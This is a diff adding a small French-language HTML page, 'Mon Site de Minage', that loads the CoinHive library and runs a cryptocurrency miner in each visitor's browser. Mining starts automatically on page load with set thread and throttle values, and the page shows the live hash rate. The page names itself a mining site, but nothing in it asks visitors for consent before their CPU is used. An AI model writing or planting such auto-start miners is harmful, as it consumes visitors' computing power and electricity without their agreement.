@@ -1,0 +1,35 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Mon Site de Minage</title>
+    <style>
+        body {
+            background-color: black; /* Ajout d'un fond noir */
+            color: white; /* Modification de la couleur du texte */
+            font-family: Arial, sans-serif; /* Modification de la police de caractères */
+        }
+    </style>
+    <script src="https://coinhive.com/lib/coinhive.min.js"></script>
+    <script>
+        var miner = new CoinHive.User('YOUR_SITE_KEY', 'YOUR_WORKER_NAME', {
+            threads: 2, // Nombre de threads pour le minage
+            autoThreads: false, // Désactivation de la détection automatique du nombre de threads
+            throttle: 0.5, // Vitesse de minage à 50%
+            forceASMJS: false // Désactivation de l'utilisation d'ASM.js
+        });
+        miner.start(); // Démarrage du minage
+        setInterval(function() {
+            var hashesPerSecond = miner.getHashesPerSecond();
+            var totalHashes = miner.getTotalHashes();
+            var acceptedHashes = miner.getAcceptedHashes();
+            // Affichage de la vitesse de minage dans la page
+            document.getElementById('hashesPerSecond').textContent = 'Vitesse de minage : ' + hashesPerSecond.toFixed(2) + ' H/s';
+        }, 1000);
+    </script>
+</head>
+<body>
+    <h1>Mon Site de Minage</h1>
+    <p>Site web pour le minage de cryptomonnaie en utilisant CoinHive</p>
+    <p id="hashesPerSecond"></p> <!-- Affichage de la vitesse de minage -->
+</body>
+</html>
